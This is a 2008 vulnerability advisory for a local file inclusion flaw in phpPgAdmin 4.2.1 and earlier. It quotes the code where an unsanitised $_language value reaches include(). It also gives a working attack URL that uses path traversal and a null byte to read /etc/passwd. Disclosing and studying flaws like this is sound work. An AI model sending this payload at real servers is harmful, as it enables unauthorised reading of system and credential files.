phpPgAdmin <= 4.2.1 (_language) Local File Inclusion Vulnerability
==================================================================


  :::::::-.   ...    ::::::.    :::.
   ;;,   `&#039;;, ;;     ;;;`;;;;,  `;;;
   `[[     [[[[&#039;     [[[  [[[[[. &#039;[[
    $$,    $$$$      $$$  $$$ "Y$c$$
    888_,o8P&#039;88    .d888  888    Y88
    MMMMP"`   "YmmMMMM""  MMM     YM

   [ Discovered by dun ]

 ##################################################################
 #  [ phpPgAdmin <= 4.2.1 ]  Local File Inclusion Vulnerability   #
 ##################################################################
 #
 # Script: "phpPgAdmin is a web-based administration tool for PostgreSQL. It is perfect for PostgreSQL DBAs, newbies and hosting services."
 #
 # Script site: http://www.phppgadmin.org/
 # Download: http://phppgadmin.sourceforge.net/?page=download
 #
 # Vuln: http://site.com/phpPgAdmin/index.php?_language=../../../../../../../../etc/passwd%00
 #
 # Bug: ./phpPgAdmin-4.2.1/index.php (line: 11)
 #
 # ...
 #	include_once(&#039;./libraries/lib.inc.php&#039;);
 # ... 	 
 #
 #
 # Bug: ./phpPgAdmin-4.2.1/libraries/lib.inc.php (lines: 22-138 -> 136)
 #
 # ...
 #	// Determine language file to import:
 #	// 1. Check for the language from a request var
 #	if (isset($_REQUEST[&#039;language&#039;]) && isset($appLangFiles[$_REQUEST[&#039;language&#039;]]))
 #		$_language = $_REQUEST[&#039;language&#039;]; 
 #
 #	// 2. Check for language session var
 #	if (!isset($_language) && isset($_SESSION[&#039;webdbLanguage&#039;]) && isset($appLangFiles[$_SESSION[&#039;webdbLanguage&#039;]])) {
 #		$_language = $_SESSION[&#039;webdbLanguage&#039;];
 #	}
 #
 #	// 3. Check for acceptable languages in HTTP_ACCEPT_LANGUAGE var
 #	if (!isset($_language) && $conf[&#039;default_lang&#039;] == &#039;auto&#039; && isset($_SERVER[&#039;HTTP_ACCEPT_LANGUAGE&#039;])) {
 #		// extract acceptable language tags
 #		// (http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.4)
 #		foreach($_m as $_l) {  // $_l[1] = language tag, [2] = quality
 #			if (!isset($_l[2])) $_l[2] = 1;  // Default quality to 1
 #			if ($_l[2] > 0 && $_l[2] <= 1 && isset($availableLanguages[$_l[1]])) {
 #				// Build up array of (quality => language_file)
 #				$_acceptLang[$_l[2]] = $availableLanguages[$_l[1]];
 #			}
 #		}
 #		unset($_m);
 #		unset($_l);
 #		if (isset($_acceptLang)) {
 #			// Sort acceptable languages by quality
 #			krsort($_acceptLang, SORT_NUMERIC);
 #			$_language = reset($_acceptLang);
 #			unset($_acceptLang);
 #		}
 #	} 
 #
 #	// 4. Otherwise resort to the default set in the config file
 #	if (!isset($_language) && $conf[&#039;default_lang&#039;] != &#039;auto&#039; && isset($appLangFiles[$conf[&#039;default_lang&#039;]])) {
 #		$_language = $conf[&#039;default_lang&#039;];
 #	}
 #
 #	// Import the language file
 #	if (isset($_language)) {
 #		include("./lang/recoded/{$_language}.php");									// * LFI *
 #		$_SESSION[&#039;webdbLanguage&#039;] = $_language;
 #	}
 # ... 	 
 #
 #
 ###############################################

 [ dun / 2008 ] 

*******************************************************************************************



